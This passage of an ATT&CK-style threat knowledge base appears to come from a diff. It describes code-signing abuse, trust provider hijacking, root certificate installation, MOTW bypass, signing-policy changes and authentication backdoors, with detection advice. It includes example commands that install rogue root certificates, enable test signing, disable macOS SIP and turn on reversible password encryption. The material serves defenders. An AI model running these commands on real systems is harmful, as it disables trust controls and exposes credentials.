+- [G0046] FIN7: FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.
+- [G1015] Scattered Spider: Scattered Spider has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.
+- [S0187] Daserf: Some Daserf samples were signed with a stolen digital certificate.
+- [G0040] Patchwork: Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda used legitimate, signed binaries such as `inkform.exe` or `ExcelRepairToolboxLauncher.exe` for follow-on execution of malicious DLLs through DLL search order hijacking in RedDelta Modified PlugX Infection Chain Operations.
+- [S0698] HermeticWizard: HermeticWizard has been signed by valid certificates assigned to Hermetica Digital.
+- [G0094] Kimsuky: Kimsuky has signed files with the name EGIS CO,. Ltd. and has stolen a valid certificate that is used to sign the malware and the dropper.
+- [S0170] Helminth: Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.
+- [S1070] Black Basta: The Black Basta dropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives.
+- [S1016] MacMa: MacMa has been delivered using ad hoc Apple Developer code signing certificates.
+- [S1183] StrelaStealer: StrelaStealer variants have used valid code signing certificates.
+- [G0093] GALLIUM: GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC.
+- [G1031] Saint Bear: Saint Bear has used an initial loader malware featuring a legitimate code signing certificate associated with "Electrum Technologies GmbH."
+- [G0096] APT41: APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.
+- [C0015] C0015: For C0015, the threat actors used DLL files that had invalid certificates.
+- [G0021] Molerats: Molerats has used forged Microsoft code-signing certificates on malware.
+- [S0663] SysUpdate: SysUpdate has been signed with stolen digital certificates.
+- [S0697] HermeticWiper: The HermeticWiper executable has been signed with a legitimate certificate issued to Hermetica Digital Ltd.
+- [S0342] GreyEnergy: GreyEnergy digitally signs the malware with a code-signing certificate.
+- [S0520] BLINDINGCAN: BLINDINGCAN has been signed with code-signing certificates such as CodeRipper.
+- [S1150] ROADSWEEP: ROADSWEEP has been digitally signed with a certificate issued to the Kuwait Telecommunications Company KSC.
+- [S1196] Troll Stealer: Troll Stealer, along with its associated dropper, utilizes legitimate, stolen code signing certificates.
+- [S0210] Nerex: Nerex drops a signed Microsoft DLL to disk.
+- [S0584] AppleJeus: AppleJeus has used a valid digital signature from Sectigo to appear legitimate.
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.
+- [S1151] ZeroCleare: ZeroCleare can deploy a vulnerable, signed driver on a compromised host to bypass operating system safeguards.
+- [S0527] CSPY Downloader: CSPY Downloader has come signed with revoked certificates.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection.
+- [S0650] QakBot: QakBot can use signed loaders to evade detection.
+- [G0049] OilRig: OilRig has signed its malware with stolen certificates.
+- [S0148] RTM: RTM samples have been signed with a code-signing certificates.
+- [S0504] Anchor: Anchor has been signed with valid certificates to evade detection by security tools.
+- [G0032] Lazarus Group: Lazarus Group has digitally signed malware and utilities to evade detection.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.
+- [S0091] Epic: Turla has used valid digital certificates from Sysprint AG to sign its Epic dropper.
+- [G1009] Moses Staff: Moses Staff has used signed drivers from an open source tool called DiskCryptor to evade detection.
+- [G0091] Silence: Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).
+- [S0559] SUNBURST: SUNBURST was digitally signed by SolarWinds from March - May 2020.
+- [G0102] Wizard Spider: Wizard Spider has used Digicert code-signing certificates for some of its malware.
+- [G0065] Leviathan: Leviathan has used stolen code signing certificates to sign malware.
+- [G0037] FIN6: FIN6 has used Comodo code-signing certificates.
+- [S0611] Clop: Clop can use code signing to evade detection.
+- [G0045] menuPass: menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.
+- [S0415] BOOSTWRITE: BOOSTWRITE has been signed by a valid CA.
+- [G0056] PROMETHIUM: PROMETHIUM has signed code with self-signed certificates.
+- [G0012] Darkhotel: Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them.
+- [S0534] Bazar: Bazar has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.
+- [G0092] TA505: TA505 has signed payloads with code signing certificates from Thawte and Sectigo.
+- [S0455] Metamorfo: Metamorfo has digitally signed executables using AVAST Software certificates.
+- [S0372] LockerGoga: LockerGoga has been signed with stolen certificates in order to make it look more legitimate.
+- [S0168] Gazer: Gazer versions are signed with various valid certificates; one was likely faked and issued by Comodo for "Solid Loop Ltd," and another was issued for "Ultimate Computer Support Ltd."
+- [S0624] Ecipekac: Ecipekac has used a valid, legitimate digital signature to evade detection.
+- [S0266] TrickBot: TrickBot has come with a signed downloader component.
+- [S0284] More_eggs: More_eggs has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.
+- [G0039] Suckfly: Suckfly has used stolen certificates to sign its malware.
+- [S0262] QuasarRAT: A QuasarRAT .dll file is digitally signed by a certificate from AirVPN.
+- [S0603] Stuxnet: Stuxnet used a digitally signed driver with a compromised Realtek certificate.
+- [S1213] Lumma Stealer: Lumma Stealer has used valid code signing digital certificates from ConsolHQ LTD and Verandah Green Limited to appear legitimate.
+- [G1034] Daggerfly: Daggerfly has used signed, but not notarized, malicious files for execution in macOS environments.
+- [S0377] Ebury: Ebury has installed a self-signed RPM package mimicking the original system package on RPM based systems.
+- [S0646] SpicyOmelette: SpicyOmelette has been signed with valid digital certificates.
+- [S1197] GoBear: GoBear uses stolen legitimate code signing certificates for defense evasion.
+- [S0491] StrongPity: StrongPity has been signed with self-signed certificates.
+- [G1014] LuminousMoth: LuminousMoth has signed their malware with a valid digital signature.
+- [S0501] PipeMon: PipeMon, its installer, and tools are signed with stolen code-signing certificates.
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP has been dropped by a self-extracting archive signed with a valid digital certificate.
+- [G0044] Winnti Group: Winnti Group used stolen certificates to sign its malware.
+- [G0052] CopyKittens: CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.
+- [S0163] Janicab: Janicab used a valid AppleDeveloperID to sign the code to get past security restrictions.
+- [S0144] ChChes: ChChes samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.
+- [C0040] APT41 DUST: APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads.
+- [S0234] Bandook: Bandook was signed with valid Certum certificates.
+
+### T1553.003 - Subvert Trust Controls: SIP and Trust Provider Hijacking
+
+Description:
+
+Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all ) and are identified by globally unique identifiers (GUIDs). Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: * Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). * Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. * Modifying the DLL and Function Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex). * **Note:** The above hijacks are also possible without modifying the Registry via DLL search order hijacking. Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.
+
+Detection:
+
+Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. Enable CryptoAPI v2 (CAPI) event logging to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). Utilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: * HKLM\SOFTWARE\Microsoft\Cryptography\OID * HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID * HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust * HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust **Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using Regsvr32. Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected.
+
+### T1553.004 - Subvert Trust Controls: Install Root Certificate
+
+Description:
+
+Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications. Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.
+
+Detection:
+
+A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. The Sysinternals Sigcheck utility can also be used (sigcheck[64].exe -tuv) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. Installed root certificates are located in the Registry under HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\ and [HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: * 18F7C1FCC3090203FD5BAA2F861A754976C8DD25 * 245C97DF7514E7CF2DF8BE72AE957B9E04741E85 * 3B1EFD3A66EA28B16697394703A72CA340A05BD5 * 7F88CD7223F3C813818C994614A89C99FA3B5247 * 8F43288AD272F3103B6FB1428485EA3014C0BCFE * A43489159A520F0D93D032CCAF37E7FE20A8B419 * BE36A4562FB2EE05DBB3D32323ADF445084ED656 * CDD4EEAE6000AC7F40C3802C171E30148030C072
+
+Procedures:
+
+- [S0160] certutil: certutil can be used to install browser root certificates as a precursor to performing Adversary-in-the-Middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\cert512121.der.
+- [S0281] Dok: Dok installs a root certificate to aid in Adversary-in-the-Middle actions using the command add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename.
+- [S0009] Hikit: Hikit installs a self-generated certificate to the local trust store as a root CA and Trusted Publisher.
+- [S0148] RTM: RTM can add a certificate to the Windows store.
+
+### T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass
+
+Description:
+
+Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it. Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.
+
+Detection:
+
+Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.
+
+Procedures:
+
+- [G0092] TA505: TA505 has used .iso files to deploy malicious .lnk files.
+- [S1025] Amadey: Amadey has modified the `:Zone.Identifier` in the ADS area to zero.
+- [G0082] APT38: APT38 has used ISO and VHD files to deploy malware and to bypass Mark-of-the-Web (MOTW) security measures.
+- [S0650] QakBot: QakBot has been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures.
+- [G0016] APT29: APT29 has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.
+
+### T1553.006 - Subvert Trust Controls: Code Signing Policy Modification
+
+Description:
+
+Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions. Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include bcdedit.exe -set TESTSIGNING ON on Windows and csrutil disable on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts. To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.
+
+Detection:
+
+Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as bcdedit.exe -set TESTSIGNING ON. Consider monitoring for modifications made to Registry keys associated with code signing policies, such as HKCU\Software\Policies\Microsoft\Windows NT\Driver Signing. Modifications to the code signing policy of a system are likely to be rare.
+
+Procedures:
+
+- [G0087] APT39: APT39 has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows.
+- [S0089] BlackEnergy: BlackEnergy has enabled the TESTSIGNING boot configuration option to facilitate loading of a driver component.
+- [S0009] Hikit: Hikit has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.
+- [S0664] Pandora: Pandora can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.
+- [G0010] Turla: Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.
+
+
+### T1556.001 - Modify Authentication Process: Domain Controller Authentication
+
+Description:
+
+Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.
+
+Detection:
+
+Monitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access).
+
+Procedures:
+
+- [G0114] Chimera: Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential.
+- [S0007] Skeleton Key: Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.
+
+### T1556.002 - Modify Authentication Process: Password Filter DLL
+
+Description:
+
+Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.
+
+Detection:
+
+Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages) and correlate then investigate the DLL files these files reference. Password filters will also show up as an autorun and loaded DLL in lsass.exe.
+
+Procedures:
+
+- [S0125] Remsec: Remsec harvests plain-text credentials as a password filter registered on domain controllers.
+- [G0049] OilRig: OilRig has registered a password filter DLL in order to drop malware.
+- [G0041] Strider: Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.
+
+### T1556.003 - Modify Authentication Process: Pluggable Authentication Modules
+
+Description:
+
+Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow. Adversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials. Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.
+
+Detection:
+
+Monitor PAM configuration and module paths (ex: /etc/pam.d/) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files. Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
+
+Procedures:
+
+- [S0377] Ebury: Ebury can deactivate PAM modules to tamper with the sshd configuration.
+- [S0468] Skidmap: Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.
+
+### T1556.004 - Modify Authentication Process: Network Device Authentication
+
+Description:
+
+Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices. Modify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password. The modification includes a specific password which is implanted in the operating system image via the patch. Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.
+
+Detection:
+
+Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory. Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image.
+
+Procedures:
+
+- [S1104] SLOWPULSE: SLOWPULSE can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password.
+- [S0519] SYNful Knock: SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device.
+
+### T1556.005 - Modify Authentication Process: Reversible Encryption
+
+Description:
+
+An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it. If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components: 1. Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters 2. 16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParameters 3. Global LSA secret (G$MSRADIUSCHAPKEY) 4. Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL) With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value. An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.
+
+Detection:
+
+Monitor property changes in Group Policy: Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy\Store passwords using reversible encryption. By default, the property should be set to Disabled. Monitor command-line usage for -AllowReversiblePasswordEncryption $true or other actions that could be related to malicious tampering of user settings (i.e. Group Policy Modification). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as Set-ADUser and Set-ADAccountControl, that change account configurations. Monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.
+
+### T1556.006 - Modify Authentication Process: Multi-Factor Authentication
+
+Description:
+
+Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts. Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality. For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a "fail open" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.
+
+Procedures:
+
+- [G1015] Scattered Spider: After compromising user accounts, Scattered Spider registers their own MFA tokens.
+- [S1104] SLOWPULSE: SLOWPULSE can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided.
+- [S0677] AADInternals: The AADInternals `Set-AADIntUserMFA` command can be used to disable MFA for a specified user.
+
+### T1556.007 - Modify Authentication Process: Hybrid Identity
+
+Description:
+
+Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts. Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID: * Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud * Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory * Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies. In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.
+
+Procedures:
+
+- [S0677] AADInternals: AADInternals can inject a malicious DLL (`PTASpy`) into the `AzureADConnectAuthenticationAgentService` to backdoor Azure AD Pass-Through Authentication.
+- [G0016] APT29: APT29 has edited the `Microsoft.IdentityServer.Servicehost.exe.config` file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.
+
+### T1556.008 - Modify Authentication Process: Network Provider DLL
+
+Description:
+
+Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening. Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`. Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function. Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.
+
+### T1556.009 - Modify Authentication Process: Conditional Access Policies
+
+Description:
+
+Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource. For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. By modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.
+
+Procedures:
+
+- [G1015] Scattered Spider: Scattered Spider has added additional trusted locations to Azure AD conditional access policies.
+
+
+### T1562.001 - Impair Defenses: Disable or Modify Tools
+
+Description:
+
+Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems. Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via File/Path Exclusions. Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in 